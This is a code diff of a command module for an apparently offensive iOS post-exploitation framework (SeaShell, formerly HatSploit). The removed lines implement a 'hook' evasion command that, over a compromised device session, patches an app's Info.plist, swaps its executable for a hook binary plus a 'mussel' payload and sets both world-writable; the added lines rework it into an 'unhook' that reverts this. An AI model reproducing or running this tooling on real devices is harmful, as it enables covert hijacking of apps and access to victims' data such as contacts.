@@ -9,23 +9,21 @@ from pwny.types import *
 from seashell.lib.loot import Loot
 from seashell.core.hook import Hook
 
-from hatsploit.lib.command import Command
+from badges.cmd import Command
 
 
-class HatSploitCommand(Command):
+class ExternalCommand(Command):
     def __init__(self):
-        super().__init__()
-
-        self.details = {
+        super().__init__({
             'Category': "evasion",
-            'Name': "hook",
+            'Name': "unhook",
             'Authors': [
                 'Ivan Nikolskiy (enty8080) - command developer'
             ],
-            'Description': "Hook into other app (e.g. Contacts).",
-            'Usage': "hook <app>",
+            'Description': "Remove hook from other app (e.g. Contacts).",
+            'Usage': "unhook <app>",
             'MinArgs': 1
-        }
+        })
 
         self.plist = Loot().specific_loot('Info.plist')
 
@@ -76,11 +74,11 @@ class HatSploitCommand(Command):
 
         return path
 
-    def run(self, argc, argv):
-        path = self.find_app(argv[1])
+    def run(self, args):
+        path = self.find_app(args[1])
 
         if not path:
-            self.print_error(f"Path for {argv[1]} not found!")
+            self.print_error(f"Path for {args[1]} not found!")
             return
 
         if not self.session.download(path + '/Info.plist', self.plist):
@@ -89,57 +87,41 @@ class HatSploitCommand(Command):
 
         self.print_process("Patching Info.plist...")
 
-        hook = Hook(host=self.session.device.server[0],
-                    port=self.session.device.server[1])
-        hook.patch_plist(self.plist)
+        hook = Hook()
+        hook.patch_plist(self.plist, revert=True)
 
         executable = hook.get_executable(self.plist)
-        self.print_information(F"Executable to replace: {executable}")
 
         if not self.session.upload(self.plist, path + '/Info.plist'):
             self.print_error("Failed to upload Info.plist!")
             return
 
         if self.session.send_command(
+            tag=FS_FILE_DELETE,
+            args={
+                TLV_TYPE_PATH: '/'.join((path, 'mussel'))
+            }
+        ).get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
+            self.print_error("Failed to delete mussel!")
+            return
+
+        if self.session.send_command(
+            tag=FS_FILE_DELETE,
+            args={
+                TLV_TYPE_PATH: '/'.join((path, executable))
+            }
+        ).get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
+            self.print_error("Failed to delete patched executable!")
+            return
+
+        if self.session.send_command(
             tag=FS_FILE_MOVE,
             args={
-                TLV_TYPE_FILENAME: '/'.join((path, executable)),
-                TLV_TYPE_PATH: '/'.join((path, executable + '.hooked'))
+                TLV_TYPE_FILENAME: '/'.join((path, executable + '.hooked')),
+                TLV_TYPE_PATH: '/'.join((path, executable))
             }
         ).get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
-            self.print_error("Failed to move original executable!")
+            self.print_error("Failed to revert original executable!")
             return
 
-        if not self.session.upload(hook.main, '/'.join((path, executable))):
-            self.print_error("Failed to upload executable!")
-            return
-
-        if not self.session.upload(hook.mussel, '/'.join((path, 'mussel'))):
-            self.print_error("Failed to upload mussel!")
-            return
-
-        self.print_process("Giving permissions to executable...")
-
-        if self.session.send_command(
-            tag=FS_CHMOD,
-            args={
-                FS_TYPE_MODE: 777,
-                TLV_TYPE_PATH: '/'.join((path, executable)),
-            }
-        ).get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
-            self.print_error(f"Failed to give permissions to executable!")
-            return
-
-        self.print_process("Giving permissions to mussel...")
-
-        if self.session.send_command(
-            tag=FS_CHMOD,
-            args={
-                FS_TYPE_MODE: 777,
-                TLV_TYPE_PATH: '/'.join((path, 'mussel')),
-            }
-        ).get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
-            self.print_error(f"Failed to give permissions to mussel!")
-            return
-
-        self.print_success(f"{argv[1]} patched successfully!")
+        self.print_success(f"{args[1]} patched successfully!")
